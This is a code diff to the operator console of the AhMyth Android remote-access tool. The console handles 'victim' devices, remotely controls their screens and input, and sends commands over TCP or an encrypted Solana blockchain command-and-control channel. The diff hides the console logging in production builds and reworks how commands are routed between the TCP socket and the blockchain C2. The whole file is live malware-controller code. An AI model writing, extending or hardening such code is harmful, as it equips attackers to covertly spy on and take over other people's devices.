@@ -4,6 +4,23 @@ var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
 var fs = require("fs-extra");
 var homedir = require('node-homedir');
 var path = require("path");
+
+// Production mode detection
+const IS_PRODUCTION = process.env.NODE_ENV === 'production' || (remote && remote.app && remote.app.isPackaged);
+const IS_DEVELOPMENT = !IS_PRODUCTION;
+
+// Logging helper - only log in development or for errors
+const devLog = (...args) => {
+    if (IS_DEVELOPMENT) {
+        console.log(...args);
+    }
+};
+const devWarn = (...args) => {
+    if (IS_DEVELOPMENT) {
+        console.warn(...args);
+    }
+};
+
 let crypto, bs58, Connection, PublicKey;
 let sendBlockchainCommandRaw = async () => {
     throw new Error('Blockchain operator module not available; configure NODE path and env before issuing blockchain lab commands');
@@ -82,12 +99,12 @@ var ORDER = CONSTANTS.order;
 var getOriginalSocket = () => {
     try {
         if (!remote || !remote.getCurrentWebContents) {
-            console.warn('[LabCtrl] remote.getCurrentWebContents not available');
+            if (IS_DEVELOPMENT) console.warn('[LabCtrl] remote.getCurrentWebContents not available');
             return null;
         }
         const webContents = remote.getCurrentWebContents();
         if (!webContents) {
-            console.warn('[LabCtrl] webContents not available');
+            devWarn('[LabCtrl] webContents not available');
             return null;
         }
         // If victimData exists, get socket from it, otherwise use victim directly (which is the socket)
@@ -103,9 +120,10 @@ var getOriginalSocket = () => {
                 return webContents.victim.socket; // It's a victim object with socket property
             }
         }
-        console.warn('[LabCtrl] No socket found in victim or victimData');
+        devWarn('[LabCtrl] No socket found in victim or victimData');
         return null;
     } catch (e) {
+        // Always log errors, even in production
         console.error('[LabCtrl] Error getting socket:', e);
         return null;
     }
@@ -179,6 +197,13 @@ function isBlockchainVictim(victim = null) {
     const conn = (typeof victim.conn === 'string' ? victim.conn : (victim.conn ? String(victim.conn) : '')).toLowerCase();
     const ipLabel = (typeof victim.ip === 'string' ? victim.ip : (victim.ip ? String(victim.ip) : '')).toLowerCase().trim();
     
+    // Explicitly check for TCP connection type
+    const isTcp = !!(
+        connectionType === 'tcp' ||
+        conn === 'tcp' ||
+        (connectionType !== 'blockchain' && conn !== 'blockchain' && !victim.isBlockchain)
+    );
+    
     // Check if it's explicitly blockchain
     const isBlockchain = !!(
         victim.isBlockchain ||
@@ -188,20 +213,28 @@ function isBlockchainVictim(victim = null) {
         ipLabel.startsWith('blockchain')
     );
     
-    // For TCP clients: if socket is connected and not explicitly blockchain, use TCP
     // Check if socket exists and is connected
     const currentSocket = getOriginalSocket();
     const hasConnectedSocket = currentSocket && currentSocket.connected;
     
-    // If it's not explicitly blockchain and has a connected socket, it's TCP
-    if (!isBlockchain && hasConnectedSocket) {
-        // Has connected socket and not blockchain - must be TCP
+    // Priority 1: If explicitly marked as blockchain, use blockchain
+    if (isBlockchain) {
+        return true;
+    }
+    
+    // Priority 2: If explicitly marked as TCP, use TCP (not blockchain)
+    if (isTcp && hasConnectedSocket) {
         return false;
     }
     
-    // If no socket connection and not explicitly blockchain, default to TCP (not blockchain)
+    // Priority 3: If has connected socket and not explicitly blockchain, it's TCP
+    if (hasConnectedSocket && !isBlockchain) {
+        return false;
+    }
+    
+    // Priority 4: Default to TCP if not explicitly blockchain
     // Only use blockchain if explicitly marked as blockchain
-    return isBlockchain;
+    return false;
 }
 
 // ---------------- Blockchain helpers -----------------
@@ -404,7 +437,7 @@ function resetBlockchainResponseTimer(key) {
         blockchainResponseTimers.set(key, timer);
         // Update start time to now so we track from when chunk arrived
         metadata.startTime = Date.now();
-        console.log(`[LabCtrl] Reset timeout for ${key} (${metadata.originalTimeout}ms from now, chunked response in progress)`);
+        devLog(`[LabCtrl] Reset timeout for ${key} (${metadata.originalTimeout}ms from now, chunked response in progress)`);
     }
 }
 
@@ -415,12 +448,12 @@ function resetAllBlockchainResponseTimers() {
         resetBlockchainResponseTimer(key);
     });
     if (keys.length > 0) {
-        console.log(`[LabCtrl] Reset ${keys.length} active timer(s) due to chunked response`);
+        devLog(`[LabCtrl] Reset ${keys.length} active timer(s) due to chunked response`);
     }
 }
 
 // Log what was loaded for debugging
-console.log('[LabCtrl] Blockchain env paths:', {
+devLog('[LabCtrl] Blockchain env paths:', {
     keysPath: blockchainKeysEnvPath,
     contractPath: blockchainContractEnvPath,
     keysFound: Object.keys(keysEnv).length > 0,
@@ -719,7 +752,7 @@ function reloadBlockchainEnv() {
         }
     }
     
-    console.log('[LabCtrl] Reloaded blockchain env:', {
+    devLog('[LabCtrl] Reloaded blockchain env:', {
         contractAddress: blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS || 'NOT SET',
         hasRpc: !!(blockchainEnv.SOLANA_RPC_URL || blockchainEnv.BLOCKCHAIN_RPC_URL),
         hasAesKey: !!blockchainEnv.BLOCKCHAIN_C2_AES_KEY,
@@ -745,7 +778,7 @@ async function sendBlockchainAndPoll(eventName, payload, isFireAndForget = false
         throw new Error('Missing operator private key (BLOCKCHAIN_PRIVATE_KEY or SOLANA_OPERATOR_PRIVATE_KEY)');
     }
     
-    console.log('[LabCtrl] Sending blockchain command:', {
+    devLog('[LabCtrl] Sending blockchain command:', {
         event: eventName,
         contract: contractAddress.substring(0, 8) + '...',
         rpc: rpc.substring(0, 30) + '...',
@@ -902,14 +935,36 @@ var socket = {
         const victim = getCurrentVictim();
         const isBlockchain = isBlockchainVictim(victim);
         
-        // For TCP clients: use TCP socket if connected
-        // Only use blockchain if explicitly blockchain OR socket is not connected
-        const useBlockchain = isBlockchain || !currentSocket || !currentSocket.connected;
+        // Determine connection type: explicitly check for TCP first
+        const connectionType = (victim.connectionType || victim.conn || '').toLowerCase();
+        const isExplicitlyTcp = connectionType === 'tcp';
+        const isExplicitlyBlockchain = connectionType === 'blockchain' || isBlockchain;
+        
+        // Routing logic with clear priorities:
+        // 1. If explicitly TCP (connectionType='tcp') -> ALWAYS use TCP (even if socket temporarily disconnected)
+        // 2. If explicitly blockchain (connectionType='blockchain') -> ALWAYS use blockchain
+        // 3. If socket is connected and not explicitly blockchain -> use TCP
+        // 4. If no socket or socket not connected and not explicitly TCP -> fallback to blockchain (for offline blockchain clients)
+        let useBlockchain = false;
+        
+        if (isExplicitlyTcp) {
+            // Explicitly TCP -> ALWAYS use TCP connection
+            useBlockchain = false;
+        } else if (isExplicitlyBlockchain) {
+            // Explicitly blockchain -> ALWAYS use blockchain
+            useBlockchain = true;
+        } else if (currentSocket && currentSocket.connected) {
+            // Has connected socket and not explicitly blockchain -> use TCP
+            useBlockchain = false;
+        } else {
+            // No socket or socket not connected and not explicitly TCP -> use blockchain (for offline blockchain clients)
+            useBlockchain = true;
+        }
         
         logToFile('REQUEST', event, data);
         if (labScope) labScope.packetCount++;
         
-        console.log(`[LabCtrl] emit(${event}): useBlockchain=${useBlockchain}, isBlockchain=${isBlockchain}, socketConnected=${currentSocket && currentSocket.connected}, connectionType=${victim.connectionType || 'unknown'}, conn=${victim.conn || 'unknown'}`);
+        devLog(`[LabCtrl] emit(${event}): useBlockchain=${useBlockchain}, isBlockchain=${isBlockchain}, socketConnected=${currentSocket && currentSocket.connected}, connectionType=${victim.connectionType || 'unknown'}, conn=${victim.conn || 'unknown'}`);
         
         if (useBlockchain) {
             const action = data && data.order ? data.order : event;
@@ -954,7 +1009,7 @@ var socket = {
         }
         // Track registration to prevent duplicate listeners
         if (registeredListeners[event]) {
-            console.log(`[AhMyth] Listener already registered for ${event}, replacing...`);
+            devLog(`[AhMyth] Listener already registered for ${event}, replacing...`);
             currentSocket.removeAllListeners(event);
         }
         registeredListeners[event] = true;
@@ -1129,7 +1184,7 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
     // Log connection type detection on initialization
     const initVictim = getCurrentVictim();
     const initIsBlockchain = isBlockchainVictim(initVictim);
-    console.log('[LabCtrl] Initialized with victim data:', {
+    devLog('[LabCtrl] Initialized with victim data:', {
         connectionType: initVictim.connectionType || 'unknown',
         conn: initVictim.conn || 'unknown',
         ip: initVictim.ip || 'unknown',
@@ -1342,7 +1397,7 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
             const totalActiveTimers = activeTimers.length + activeSendPollTimers.length;
             
             if (totalActiveTimers > 0) {
-                console.log(`[LabCtrl] Chunk ${chunkInfo.part}/${chunkInfo.total} received (${chunkInfo.received || '?'}/${chunkInfo.total}) - resetting ${totalActiveTimers} active timer(s)`);
+                devLog(`[LabCtrl] Chunk ${chunkInfo.part}/${chunkInfo.total} received (${chunkInfo.received || '?'}/${chunkInfo.total}) - resetting ${totalActiveTimers} active timer(s)`);
                 
                 // Reset blockchainResponseTimers
                 if (activeTimers.length > 0) {
@@ -1354,11 +1409,11 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
                     activeSendPollTimers.forEach(eventName => {
                         const timerInfo = sendBlockchainAndPollTimers.get(eventName);
                         if (timerInfo && timerInfo.state && !timerInfo.state.resolved) {
-                            console.log(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
+                            devLog(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
                             timerInfo.createTimer(); // Reset with full timeout duration
                         } else if (timerInfo && !timerInfo.resolved()) {
                             // Fallback to function check
-                            console.log(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
+                            devLog(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
                             timerInfo.createTimer(); // Reset with full timeout duration
                         }
                     });
@@ -3931,7 +3986,7 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             return;
         }
         
-        console.log('[AhMyth] sendKey called with:', key);
+        devLog('[AhMyth] sendKey called with:', key);
         
         // Check socket connection
         var isConnected = false;
@@ -4470,9 +4525,9 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             
             // Set up handler for fullscreen input events forwarded from main process
             ipcRenderer.on('fullscreen-input-event', (event, data) => {
-                console.log('[AhMyth] Fullscreen input received:', data);
+                devLog('[AhMyth] Fullscreen input received:', data);
                 if (data.type === 'tap') {
-                    console.log('[AhMyth] Sending tap to device:', data.x, data.y);
+                    devLog('[AhMyth] Sending tap to device:', data.x, data.y);
                     socket.emit(ORDER, {
                         order: input,
                         action: 'tap',
@@ -4713,7 +4768,7 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
                 $ScreenCtrl.permissionRequired = false;
             }
         } else {
-            console.log('[AhMyth] Received screen data:', data);
+            devLog('[AhMyth] Received screen data:', data);
         }
         
         if (!$ScreenCtrl.$$phase) {
